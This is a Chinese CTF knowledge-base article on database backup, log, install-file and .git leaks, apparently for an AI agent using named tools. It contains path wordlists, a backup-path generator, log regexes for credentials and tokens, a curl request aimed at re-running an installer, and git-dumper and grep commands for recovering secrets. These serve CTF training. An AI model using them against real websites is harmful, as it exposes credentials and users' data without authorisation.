---
id: "ctf-website/24-database/05-backup-log-leak"
title: "Database Backup & Log Leak — 数据库备份与日志泄露"
title_en: "Database Backup & Log Leak — Backup Files & Log Exposure"
summary: >
  运维疏忽导致的数据库直接暴露：SQL备份文件（.sql/.dump/.tar.gz）路径枚举与时间戳猜测、MySQL慢查询/通用查询日志泄露完整SQL语句、安装文件残留（install.sql默认管理员密码哈希）、phpMyAdmin/Adminer未授权访问，以及.git源码泄露恢复数据库凭证。
summary_en: >
  Direct database exposure from operational negligence: SQL backup file (.sql, .dump, .tar.gz) path enumeration and timestamp guessing, MySQL slow/general query log leaks containing full SQL statements, installation file remnants (install.sql with default admin password hashes), phpMyAdmin/Adminer unauthorized access, and .git source code recovery for database credentials.
board: "ctf-website"
category: "24-database"
signals:
  - ".sql .dump 备份文件"
  - "backup_20250101.sql"
  - "slow.log general.log MySQL"
  - "install/install.sql"
  - "phpMyAdmin /phpmyadmin/"
  - "Adminer /adminer.php"
  - ".git/HEAD git-dumper"
  - "install.lock"
mcp_tools:
  - "http_probe"
  - "kb_router"
  - "kb_read_file"
keywords:
  - "数据库备份泄露"
  - ".sql 文件"
  - "备份路径枚举"
  - "日志泄露"
  - "phpMyAdmin"
  - "Adminer"
  - "install.sql"
  - "Git 泄露"
  - "慢查询日志"
  - "源码恢复"
difficulty: "intermediate"
tags:
  - "database"
  - "backup"
  - "logs"
  - "information-disclosure"
  - "phmyadmin"
  - "git-leak"
language: "zh-CN"
last_updated: "2026-07-04"
related_articles: []
---
# Database Backup & Log Leak — 数据库备份与日志泄露

> SQL 备份文件、日志文件、安装残留——运维疏忽导致的数据库直接暴露。

## 关键词

`数据库备份` `.sql泄露` `备份文件` `日志泄露` `安装残留` `install.sql` `dump.sql` `慢查询日志` `general_log` `phpMyAdmin` `Adminer` `数据库导出`

## 1. 备份文件常见路径

### 1.1 根目录备份

```
/db.zip
/data.zip
/backup.zip
/database.zip
/sql.zip
/wwwroot.zip
/web.zip
/1.zip / 2.zip / 3.zip
/2024.zip / 2025.zip / 2026.zip
```

### 1.2 SQL 文件

```
/data.sql
/db.sql
/backup.sql
/database.sql
/dump.sql
/all.sql
/export.sql
/install.sql
/mysql.sql
/shuadan.sql
```

### 1.3 压缩备份

```
/data.tar.gz
/backup.tar.gz
/db.tar.gz
/www.tar.gz
/mysql.tar.gz
/sql.tar.gz
/backup.rar
/data.rar
```

### 1.4 目录备份

```
/backup/
/backups/
/data/backup/
/data/sql/
/database/backup/
/sqlbackup/
/dbbackup/
/export/
/dump/
```

## 2. 时间戳猜测

备份文件常用日期命名：

```
backup_20250101.sql
db_202501.zip
database_2025-01-01.sql.gz
mysql_dump_20250101_120000.sql
```

### 2.1 候选路径生成器

把站点名、目录名、年份、常见后缀组合起来，命中率比静态字典高很多。

```python
from datetime import date, timedelta

def backup_candidates(host="example", roots=("", "backup", "data", "db")):
    names = {host, "db", "database", "data", "backup", "dump", "mysql", "www", "web"}
    exts = ["sql", "sql.gz", "dump", "zip", "tar.gz", "rar", "7z", "bak", "old"]
    today = date.today()
    dates = {
        today.strftime("%Y%m%d"),
        today.strftime("%Y-%m-%d"),
        str(today.year),
        str(today.year - 1),
    }
    for root in roots:
        prefix = f"/{root.strip('/')}/" if root else "/"
        for name in names:
            for ext in exts:
                yield f"{prefix}{name}.{ext}"
                yield f"{prefix}{name}_backup.{ext}"
                for d in dates:
                    yield f"{prefix}{name}_{d}.{ext}"
                    yield f"{prefix}{d}_{name}.{ext}"

for path in backup_candidates("shop"):
    print(path)
```

命中判断：`200` + `Content-Length` 大、`application/octet-stream`、`Last-Modified` 接近部署时间、文件头为 `PK`/`1F 8B`/SQL 文本。`403` 也要记录，可能说明路径存在但目录规则拦下载。

## 3. 日志文件泄露

### 3.1 MySQL 日志

```
-- 慢查询日志路径
/var/log/mysql/slow.log
/var/log/mysql/mysql-slow.log

-- 通用查询日志 (记录所有SQL!)
/var/log/mysql/general.log
```

### 3.2 应用日志

```
/runtime/log/              (ThinkPHP)
/storage/logs/             (Laravel)
/var/log/                  (Linux)
/logs/
/log/
/error.log
/access.log
/debug.log
```

日志文件中可能包含：
- 完整 SQL 语句（包括 INSERT 的敏感数据）
- 数据库连接字符串
- API 密钥和 Token

### 3.3 日志提取正则

```python
import re

PATTERNS = {
    "mysql_dsn": re.compile(r"(mysql|pgsql|postgres)://[^\\s'\"<>]+", re.I),
    "pdo": re.compile(r"PDO\\([^)]*(mysql|pgsql|sqlite)[^)]*\\)", re.I),
    "sql_insert": re.compile(r"INSERT\\s+INTO\\s+[`\\w]+.*", re.I),
    "sql_error": re.compile(r"(SQLSTATE\\[[^]]+\\]|You have an error in your SQL syntax|ORA-\\d+)", re.I),
    "token": re.compile(r"(api[_-]?key|token|secret|password)\\s*[:=]\\s*['\"]?([^'\"\\s]+)", re.I),
}

def scan_log(text):
    for name, rx in PATTERNS.items():
        for m in rx.finditer(text):
            print(name, m.group(0)[:220])
```

日志里看到 `SELECT ... WHERE username='x'`，可以反推注入闭合方式；看到 `INSERT INTO users`，可以直接定位用户表字段顺序。

## 4. 安装文件残留

### 4.1 安装目录

```
/install/
/install/index.php
/install/install.sql
/install/data.sql
/install/sql/install.sql
```

安装 SQL 文件包含：
- 完整数据库结构（CREATE TABLE）
- 默认管理员账号密码哈希
- 初始配置数据

### 4.2 安装锁文件

```
/install/install.lock      # 内容 "ok" → 已安装
/install/lock
/data/install.lock
```

### 4.3 安装绕过

```bash
# 尝试直接 POST 安装表单
curl -X POST target/install/index.php?s=install \
  -d "hostname=127.0.0.1&database=test&username=root&password=&prefix=shua"
```

## 5. 数据库管理工具

### 5.1 phpMyAdmin

```
/phpmyadmin/
/pma/
/mysql/
/phpmyadmin/index.php
/admin/phpmyadmin/
```

### 5.2 Adminer

```
/adminer.php
/db.php
/editor.php
/sql.php
/admin/adminer.php
```

### 5.3 其他工具

```
/phpminiadmin.php
/sqlbuddy/
/adminer/
/dbadmin/
```

## 6. Git 泄露与源码恢复

```bash
# 检测 .git 泄露
curl target/.git/HEAD

# 使用工具恢复
git-dumper target/.git output/
```

### 6.1 Git 泄露后定位数据库信息

```bash
rg -n "DB_HOST|DB_DATABASE|DB_USERNAME|DB_PASSWORD|DATABASE_URL|MYSQL|PGSQL|REDIS|MONGO" output/
rg -n "create table|insert into|select .* from|where .*\\$|order by .*\\$" output/
git -C output log --oneline --all --decorate -20
git -C output grep -n "password\\|secret\\|token\\|flag" $(git -C output rev-list --all)
```

重点文件：

```text
.env
config.php
database.php
settings.py
config/database.yml
application.yml
docker-compose.yml
backup.sql
migrations/
seeders/
```

### 6.2 Dump 快速解析

```python
import re
from pathlib import Path

def summarize_sql_dump(path):
    text = Path(path).read_text(errors="ignore")
    tables = re.findall(r"CREATE TABLE [`\"]?([^`\"\\s(]+)", text, re.I)
    inserts = re.findall(r"INSERT INTO [`\"]?([^`\"\\s(]+)", text, re.I)
    interesting = [t for t in set(tables + inserts)
                   if re.search(r"user|admin|flag|token|secret|config|order", t, re.I)]
    print("[tables]", tables[:50])
    print("[interesting]", interesting)
    for table in interesting:
        m = re.search(rf"INSERT INTO [`\"]?{re.escape(table)}[`\"]?.{{0,500}}", text, re.I | re.S)
        if m:
            print(f"[sample:{table}]", m.group(0)[:500])
```

遇到大 dump：先 `rg -n "flag\\{|CTF\\{|admin|password|token|secret" dump.sql`，再按表拆分；不要先整库导入。

## 攻击链 / 工作流

```
1. 从站点名、目录名、时间戳、部署习惯生成备份候选路径
2. 探测 .sql/.dump/.zip/.tar.gz/.bak/.old/.log/.git 等静态资源
3. 对命中文件先记录响应头、大小、hash，再下载到隔离目录分析
4. 解压/解析后提取 schema、用户表、订单表、日志中的 SQL/Token/错误栈
5. 关联配置泄露与源码恢复：定位数据库连接、后台路径、框架版本
6. 对 Git 泄露执行最小恢复，确认源码/配置/历史提交是否含敏感信息
7. 输出影响面：泄露表、时间范围、字段类型、可独立使用资产和下一跳入口
```

## Evidence

| 证据类型 | 记录内容 |
|----------|----------|
| 文件命中 | URL、状态码、Content-Length、ETag/Last-Modified |
| 完整性 | SHA256、文件大小、解压后的文件列表 |
| 数据内容 | 表名、字段名、样例行、日志关键片段 |
| 源码恢复 | `.git/HEAD`、恢复提交、敏感文件路径 |

## MCP 工具映射

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| 知识检索 | `kb_router` | 按 backup leak、log leak、git exposure 搜索 |
| HTTP 探测 | `http_probe` | 批量验证候选备份/日志路径 |
| 工具执行 | `run_ctf_tool` | 调用 git-dumper、目录枚举、解包/解析脚本 |
| 证据记录 | `workspace_write_text` | 保存文件哈希、字段样例和恢复清单 |

## 7. 关联技术

- [[04-config-exposure]] — 配置文件泄露
- [[01-sqli-fundamentals]] — 数据库连接后的利用
- [[06-card-platform]] — 发卡平台实战
- [[file-upload-xxe-lfi]] — 文件读取
